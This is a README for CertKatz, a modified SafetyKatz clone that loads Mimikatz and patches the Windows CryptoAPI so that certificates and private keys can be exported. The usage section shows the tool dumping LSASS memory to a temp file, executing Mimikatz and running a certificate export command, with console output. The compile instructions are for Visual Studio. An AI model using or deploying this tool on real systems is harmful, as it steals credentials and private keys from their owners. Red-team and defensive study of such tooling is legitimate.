# CertKatz

----

CertKatz is a clone of [@harmj0y](https://twitter.com/harmj0y)'s
SafetyKatz project, slightly modified to expose [@gentilkiwi](https://twitter.com/gentilkiwi)'s [Mimikatz](https://github.com/gentilkiwi/mimikatz/) Crypto module instead of automatically dump LSASS. CertKatz is the exact same as SafeyKatz except for the below changes.


CertKatz automatically patches the Crypto API `crypto::capi` on startup. This is useful in environments where each run of a utility occurs in an independent process.


CertKatz is licensed under the BSD 3-Clause license.

## Usage

    C:\Temp>CertKatz.exe "cyrpto::certificates /export"

    [*] Dumping lsass (808) to C:\WINDOWS\Temp\debug.bin
    [+] Dump successful!

    [*] Executing loaded Mimikatz PE

    .#####.   mimikatz 2.1.1 (x64) built on Jul  7 2018 03:36:26 - lil!
    .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
    ## / \ ##  / *** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
    ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
    '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
    '#####'        > http://pingcastle.com / http://mysmartlogon.com   *** /

    Local CryptoAPI patched

    mimikatz(commandline) # crypto::certificates /export
     * System Store  : 'CURRENT_USER' (0x00010000)
     * Store         : 'My'


## Compile Instructions

We are not planning on releasing binaries for CertKatz, so you will have to compile yourself :)

CertKatz has been built against.NET 3.5 and is compatible with[Visual Studio 2015 Community Edition](https://go.microsoft.com/fwlink/?LinkId=532606&clcid=0x409). Simply open up the project .sln, choose "release", and build.

